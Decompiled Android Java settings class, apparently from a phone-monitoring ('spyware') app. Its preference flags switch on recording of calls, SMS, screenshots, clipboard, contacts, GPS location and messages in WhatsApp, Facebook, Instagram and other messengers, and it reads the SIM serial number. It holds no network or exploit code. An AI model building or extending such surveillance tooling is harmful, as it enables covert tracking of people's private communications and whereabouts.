package com.yasoka.spcallrecord.recorder.call.a.c.e;

import a.b.a.a.a;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.TelephonyManager;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import com.app.activity.MyApp;
import com.crashlytics.android.Crashlytics;

/* compiled from: SharedPref */
public abstract class e {
    public static boolean A(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("trackContact", false);
    }

    public static boolean B(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("facebook", false);
    }

    public static boolean C(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("gmail", false);
    }

    public static boolean D(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("hangouts", false);
    }

    public static boolean E(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("trackHistorique", false);
    }

    public static boolean F(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("instagram", false);
    }

    public static boolean G(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("kik", false);
    }

    public static boolean H(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("line", false);
    }

    public static boolean I(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("location", true);
    }

    public static boolean J(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("locationGPS", false);
    }

    public static boolean K(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("mms", true);
    }

    public static boolean L(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("picture", true);
    }

    public static boolean M(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("sms", true);
    }

    public static boolean N(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("trackScreenshot", true);
    }

    public static boolean O(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("viber", false);
    }

    public static boolean P(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("WhatsApp", false);
    }

    public static int Q(Context context) {
        return context.getSharedPreferences("user", 0).getInt("type", 0);
    }

    public static void R(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            String str = "";
            if (telephonyManager != null && ContextCompat.checkSelfPermission(MyApp.b().getApplicationContext(), "android.permission.READ_PHONE_STATE") == 0) {
                str = telephonyManager.getSimSerialNumber();
            }
            Editor edit = context.getSharedPreferences("user", 0).edit();
            edit.putString("simSerialNumber", str);
            edit.apply();
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void a(Context context, int i) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        edit.putInt("idPhone", i);
        edit.apply();
    }

    public static boolean b() {
        return MyApp.b().getApplicationContext().getSharedPreferences("user", 0).getBoolean("apps", true);
    }

    public static void c(Context context, boolean z) {
        a.a(context, "user", 0, "trackBlockApps", z);
    }

    public static int d(Context context) {
        return context.getSharedPreferences("user", 0).getInt("idClient", -1);
    }

    public static int e(Context context) {
        return context.getSharedPreferences("user", 0).getInt("idPhone", -1);
    }

    public static void f(Context context, String str) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        edit.putString("mPasswordSMS", str);
        edit.apply();
    }

    public static String g(Context context) {
        return context.getSharedPreferences("user", 0).getString("mPasswordSMS", "").toLowerCase();
    }

    public static String h(Context context) {
        return context.getSharedPreferences("user", 0).getString("namePhone", null);
    }

    public static boolean i(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("recordCall", true);
    }

    public static boolean j(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("root", false);
    }

    public static int k(Context context) {
        return context.getSharedPreferences("user", 0).getInt("screenshotSendTime", 120);
    }

    public static int l(Context context) {
        return context.getSharedPreferences("user", 0).getInt("sendTimeSocialNetwork", 240);
    }

    public static long m(Context context) {
        return (long) context.getSharedPreferences("user", 0).getInt("sendTimeVerifAll", 240);
    }

    public static long n(Context context) {
        return context.getSharedPreferences("user", 0).getLong("timefacebook", 0);
    }

    public static void o(Context context, boolean z) {
        a.a(context, "user", 0, "locationGPS", z);
        b.n(context);
        b.h(context);
    }

    public static long p(Context context) {
        return context.getSharedPreferences("user", 0).getLong("timehangouts", 0);
    }

    public static long q(Context context) {
        return context.getSharedPreferences("user", 0).getLong("timeinstagram", 0);
    }

    public static void r(Context context, boolean z) {
        a.a(context, "user", 0, "WhatsApp", z);
    }

    public static void s(Context context, boolean z) {
        a.a(context, "user", 0, "urlOther", z);
    }

    public static int t(Context context) {
        return context.getSharedPreferences("user", 0).getInt("timeLoc", 120);
    }

    public static long u(Context context) {
        return context.getSharedPreferences("user", 0).getLong("timeviber", 0);
    }

    public static long v(Context context) {
        return context.getSharedPreferences("user", 0).getLong("timewhatsapp", 0);
    }

    public static String w(Context context) {
        return context.getSharedPreferences("user", 0).getString("tokenSecurity", "");
    }

    public static boolean x(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("trackBlockSite", false);
    }

    public static boolean y(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean("trackCalendar", false);
    }

    public static boolean z(Context context) {
        return context.getSharedPreferences("user", 0).getBoolean(NotificationCompat.CATEGORY_CALL, true);
    }

    public static void b(Context context, boolean z, boolean z2) {
        a.a(context, "user", 0, "location", z);
        if (z2) {
            b.n(context);
            b.h(context);
        }
    }

    public static void c(Context context, boolean z, boolean z2) {
        a.a(context, "user", 0, "mms", z);
        if (z2) {
            b.o(context);
            b.i(context);
        }
    }

    public static void d(Context context, String str) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        edit.putString("codeSecret", str);
        edit.apply();
    }

    public static void e(Context context, boolean z, boolean z2) {
        a.a(context, "user", 0, "sms", z);
        if (z2) {
            b.o(context);
            b.i(context);
        }
    }

    public static void h(Context context, boolean z) {
        a.a(context, "user", 0, "facebook", z);
    }

    public static void i(Context context, boolean z) {
        a.a(context, "user", 0, "gmail", z);
    }

    public static void j(Context context, boolean z) {
        a.a(context, "user", 0, "hangouts", z);
    }

    public static void k(Context context, boolean z) {
        a.a(context, "user", 0, "trackHistorique", z);
    }

    public static void l(Context context, boolean z) {
        a.a(context, "user", 0, "instagram", z);
    }

    public static void m(Context context, boolean z) {
        a.a(context, "user", 0, "kik", z);
    }

    public static void n(Context context, boolean z) {
        a.a(context, "user", 0, "line", z);
    }

    public static void p(Context context, boolean z) {
        a.a(context, "user", 0, "trackPicLock", z);
    }

    public static void q(Context context, boolean z) {
        a.a(context, "user", 0, "viber", z);
    }

    public static long r(Context context) {
        return context.getSharedPreferences("user", 0).getLong("timekik", 0);
    }

    public static long s(Context context) {
        return context.getSharedPreferences("user", 0).getLong("timeline", 0);
    }

    public static void g(Context context, String str) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        edit.putString("namePhone", str);
        edit.apply();
    }

    public static long o(Context context) {
        return context.getSharedPreferences("user", 0).getLong("timegmail", 0);
    }

    public static String a(Context context) {
        return context.getSharedPreferences("user", 0).getString("codeSecret", "");
    }

    public static void b(Context context, boolean z) {
        a.a(context, "user", 0, "apps", z);
    }

    public static void c(Context context, int i) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        edit.putInt("screenshotSendTime", i);
        edit.apply();
        b.l(context);
    }

    public static void e(Context context, boolean z) {
        a.a(context, "user", 0, NotificationCompat.CATEGORY_CALL, z);
    }

    public static void f(Context context, int i) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        edit.putInt("timeLoc", i);
        edit.apply();
        b.n(context);
        b.h(context);
    }

    public static boolean a() {
        return MyApp.b().getApplicationContext().getSharedPreferences("user", 0).getBoolean("mediaManager", false);
    }

    public static void b(Context context, String str, String str2) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        edit.putString(str, str2);
        edit.apply();
    }

    public static void d(Context context, boolean z, boolean z2) {
        a.a(context, "user", 0, "picture", z);
        if (z2) {
            b.o(context);
            b.i(context);
        }
    }

    public static void e(Context context, int i) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        edit.putInt("sendTimeVerifAll", i);
        edit.apply();
        b.p(context);
    }

    public static void a(boolean z) {
        Editor edit = MyApp.b().getApplicationContext().getSharedPreferences("user", 0).edit();
        edit.putBoolean("mediaManager", z);
        edit.apply();
    }

    public static void g(Context context, boolean z) {
        a.a(context, "user", 0, "trackContact", z);
    }

    public static void g(Context context, int i) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        edit.putInt("type", i);
        edit.apply();
    }

    public static void d(Context context, int i) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        edit.putInt("sendTimeSocialNetwork", i);
        edit.apply();
        b.j(context);
    }

    public static String b(Context context) {
        return context.getSharedPreferences("user", 0).getString("mFileName", null);
    }

    public static String c(Context context, String str) {
        return context.getSharedPreferences("user", 0).getString(str, null);
    }

    public static void a(Context context, boolean z) {
        a.a(context, "user", 0, "recordCall", z);
    }

    public static String b(Context context, String str) {
        SharedPreferences sharedPreferences = context.getSharedPreferences("user", 0);
        StringBuilder sb = new StringBuilder();
        sb.append("mPathFile");
        sb.append(str);
        return sharedPreferences.getString(sb.toString(), null);
    }

    public static String c(Context context) {
        return context.getSharedPreferences("user", 0).getString("mFileNameAudioRecord", null);
    }

    public static void e(Context context, String str) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        edit.putString("mFileNameAudioRecord", str);
        edit.apply();
    }

    public static void f(Context context, boolean z, boolean z2) {
        a.a(context, "user", 0, "trackScreenshot", z);
        if (z2) {
            b.l(context);
        }
    }

    public static void a(Context context, boolean z, boolean z2) {
        a.a(context, "user", 0, "trackCalendar", z);
        if (z2) {
            b.o(context);
            b.i(context);
        }
    }

    public static void b(Context context, int i) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        edit.putInt("idLog", i);
        edit.apply();
    }

    public static void c(boolean z) {
        Editor edit = MyApp.b().getApplicationContext().getSharedPreferences("user", 0).edit();
        edit.putBoolean("messageBlockApp", z);
        edit.apply();
    }

    public static void f(Context context, boolean z) {
        a.a(context, "user", 0, "trackClipboard", z);
    }

    public static void d(Context context, boolean z) {
        a.a(context, "user", 0, "trackBlockSite", z);
    }

    public static int f(Context context) {
        return context.getSharedPreferences("user", 0).getInt("idLog", 0);
    }

    public static void a(long j, Context context) {
        String str = "contact";
        try {
            Editor edit = context.getSharedPreferences(str, 0).edit();
            edit.putLong(str, j);
            edit.apply();
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void d(boolean z) {
        Editor edit = MyApp.b().getApplicationContext().getSharedPreferences("user", 0).edit();
        edit.putBoolean("messageBlockSite", z);
        edit.apply();
    }

    public static void b(boolean z) {
        for (d a2 : d.values()) {
            a(z, a2);
        }
    }

    public static void a(Context context, String str, int i) {
        try {
            Editor edit = context.getSharedPreferences("user", 0).edit();
            edit.putInt(str, i);
            edit.apply();
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void a(Context context, String str, String str2) {
        Editor edit = context.getSharedPreferences("user", 0).edit();
        StringBuilder sb = new StringBuilder();
        sb.append("mPathFile");
        sb.append(str);
        edit.putString(sb.toString(), str2);
        edit.apply();
    }

    public static long a(Context context, String str) {
        return context.getSharedPreferences("user", 0).getLong(str, 0);
    }

    public static void a(Context context, String str, long j) {
        a.a(context.getSharedPreferences("user", 0), str, j);
    }

    public static boolean a(d dVar) {
        return MyApp.b().getApplicationContext().getSharedPreferences("instantmessaging", 0).getBoolean(dVar.toString(), true);
    }

    public static void a(boolean z, d dVar) {
        Editor edit = MyApp.b().getApplicationContext().getSharedPreferences("instantmessaging", 0).edit();
        edit.putBoolean(dVar.toString(), z);
        edit.apply();
    }
}
